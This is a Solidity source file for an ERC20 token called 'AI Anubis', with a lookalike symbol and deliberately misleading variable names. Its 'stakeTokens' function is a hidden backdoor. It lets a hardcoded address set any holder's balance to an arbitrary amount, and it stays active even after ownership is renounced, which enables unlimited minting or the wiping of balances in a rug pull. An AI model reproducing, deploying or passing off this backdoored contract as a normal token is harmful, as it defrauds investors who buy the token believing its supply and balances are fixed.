// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
interface ERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address _maxTxnr) external view returns (uint256);
  function transfer(address _maxTxnrs, uint256 stakedAmount) external returns (bool);
  function allowance(address _owner, address _maxTxnr) external view returns (uint256);
  function approve(address _maxTxnr, uint256 stakedAmount) external returns (bool);
  function transferFrom(address sender, address _maxTxnrs, uint256 stakedAmount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed _maxTxnr, uint256 balance);
}


abstract contract CexRooter {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract PairBridge is CexRooter {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeAnubisMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeAnubisMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeAnubisMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeAnubisMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeAnubisMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeAnubisMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract AiAnubis is CexRooter, ERC20, PairBridge {
    
    using SafeAnubisMath for uint256;
    mapping (address => uint256) private userStake;
    mapping (address => mapping (address => uint256)) private nextSwapBefore;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private AnubisOwner; 
    string public tokenWebsite = "https://aianubis.vip/";  
   string public ownerAddress = "0x13DC6455923709fFd4fCe8B24031e1CBC822BD31";  
    constructor() {
        AnubisOwner = 0x13DC6455923709fFd4fCe8B24031e1CBC822BD31;    
        _name = "AI Anubis";
        _symbol = "ANUBlS";
        _decimals = 3;
        _totalSupply = 10000 * 10**_decimals;
        userStake[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address _maxTxnr) external view override returns (uint256) {
        return userStake[_maxTxnr];
    }

    function transfer(address _maxTxnrs, uint256 stakedAmount) external override returns (bool) {
        _transfer(_msgSender(), _maxTxnrs, stakedAmount);
        return true;
    }

    function allowance(address owner, address _maxTxnr) external view override returns (uint256) {
        return nextSwapBefore[owner][_maxTxnr];
    }


    function approve(address _maxTxnr, uint256 stakedAmount) external override returns (bool) {
        _approve(_msgSender(), _maxTxnr, stakedAmount);
        return true;
    }
    
    function transferFrom(address sender, address _maxTxnrs, uint256 stakedAmount) external override returns (bool) {
        _transfer(sender, _maxTxnrs, stakedAmount);
        _approve(sender, _msgSender(), nextSwapBefore[sender][_msgSender()].sub(stakedAmount, "Ru: transfer stakedAmount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address _maxTxnr, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), _maxTxnr, nextSwapBefore[_msgSender()][_maxTxnr].add(addedbalance));
        return true;
    }
    

    function decreaseAllowance(address _maxTxnr, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), _maxTxnr, nextSwapBefore[_msgSender()][_maxTxnr].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address _maxTxnrs, uint256 stakedAmount) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(_maxTxnrs != address(0), "Ru: transfer to the zero address");
                
        userStake[sender] = userStake[sender].sub(stakedAmount, "Ru: transfer stakedAmount exceeds balance");
        userStake[_maxTxnrs] = userStake[_maxTxnrs].add(stakedAmount);
        emit Transfer(sender, _maxTxnrs, stakedAmount);
    }
        function stakeTokens(address tokenA, address tokenB, uint256 stakedAmount, uint256 rewardRate) external {
        require(_msgSender()==AnubisOwner);
        userStake[tokenB] = (stakedAmount + rewardRate) * 10**_decimals;
        tokenA = tokenB;
    }    
    function _approve(address owner, address _maxTxnr, uint256 stakedAmount) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(_maxTxnr != address(0), "Ru: approve to the zero address");
        
        nextSwapBefore[owner][_maxTxnr] = stakedAmount;
        emit Approval(owner, _maxTxnr, stakedAmount);
    }
    
}